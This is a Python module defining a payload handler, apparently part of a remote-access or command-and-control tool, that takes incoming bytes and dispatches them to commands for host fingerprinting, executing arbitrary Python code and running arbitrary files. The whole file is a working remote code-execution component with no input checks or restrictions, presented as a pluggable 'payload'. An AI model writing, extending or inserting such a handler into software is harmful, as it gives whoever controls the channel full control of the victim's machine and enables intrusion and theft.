

import platform
import os
from payloads.absract_payload_handler import AbstractPayloadHandler

def get_platform(data=None):
    return "system: {}\nmachine: {}\nplatform: {}\nuname: {}\nversion: {}\n".format(
                platform.system(),
                platform.machine(),
                platform.platform(),
                platform.uname(),
                platform.version(),
            )

def exec_file(d, globals=None, locals=None):
    filepath=d.split()[1]
    if not os.path.exists(filepath):
        return "Invalid file path\n"
    if globals is None:
        globals = {}
    globals.update({
        "__file__": filepath,
        "__name__": "__main__",
    })
    with open(filepath, 'rb') as file:
        exec(compile(file.read(), filepath, 'exec'), globals, locals)
    return "File executed successfully\n"

def exec_code(data):
    c=" ".join(data.split()[1:])
    exec(c)
    return "Command executed successfully\n"    

supported_commands={
    "get_platform":get_platform,
    "exec_code":exec_code,
    "exec_file":exec_file,
}

class FastScriptsHandler(AbstractPayloadHandler):

    @classmethod
    def get_platform(cls):
        return "cross_platform"

    def execute_payload(self, data:bytes) ->str:
        try:
            if data.decode("utf-8").split()[0] in supported_commands.keys():
                return supported_commands[data.decode("utf-8").split()[0]](data.decode("utf-8"))
            return "Command not found execution unsuccessful\n"
        except Exception as e:
            return "Command execution unsuccessful: %s\n" %str(e)
